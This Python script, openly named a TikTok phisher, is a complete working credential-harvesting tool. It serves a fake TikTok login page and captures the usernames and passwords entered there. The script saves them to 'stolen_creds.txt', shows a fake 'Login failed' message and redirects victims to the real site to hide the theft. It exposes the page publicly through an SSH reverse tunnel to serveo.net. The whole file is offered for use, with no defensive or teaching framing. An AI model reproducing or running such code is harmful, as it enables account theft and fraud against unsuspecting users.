#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tiktok_phisher_simple.py
Server Phishing Sederhana + Serveo (Tanpa Install Ngrok).
"""

import os
import sys
import subprocess
import threading
import time
import webbrowser

def install_deps():
    try:
        import flask
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])

install_deps()

from flask import Flask, request, jsonify

app = Flask(__name__)

# الصفحة المزورة (نفس التصميم اللي عملناه)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in | TikTok</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; background: #fff; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 8px; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/images/logo.svg">
        <h2>Log in to TikTok</h2>
        <form id="f">
            <input type="text" id="u" placeholder="Username/Email" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('f').onsubmit = function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: document.getElementById('u').value, password: document.getElementById('p').value})
            }).then(() => {
                alert("Login failed!");
                window.location.href = "https://www.tiktok.com/login";
            });
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    print("\n" + "="*50)
    print("[!] 🚨 بيانات جديدة! 🚨")
    print(f"User: {data.get('email')}")
    print(f"Pass: {data.get('password')}")
    print("="*50 + "\n")
    
    with open("stolen_creds.txt", "a", encoding="utf-8") as f:
        f.write(f"User: {data.get('email')} | Pass: {data.get('password')}\n")
        
    return jsonify({"status": "ok"}), 200

def open_browser():
    time.sleep(1.5)
    webbrowser.open("http://127.0.0.1:5000")

def start_serveo():
    print("[*] جاري فتح رابط عام (Serveo)...")
    print("[*] الرابط هيظهر تحت في سطر فيه 'Forwarding HTTP traffic from:'")
    print("-" * 50)
    # أمر Serveo (SSH) عشان يعمل البورت فوروارد
    os.system("ssh -R 80:localhost:5000 serveo.net")

if __name__ == '__main__':
    print("=" * 50)
    print("   TIKTOK PHISHER (SIMPLE)")
    print("=" * 50)
    
    # تشغيل السيرفر في الخلفية
    threading.Thread(target=open_browser, daemon=True).start()
    threading.Thread(target=start_serveo, daemon=True).start()
    
    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)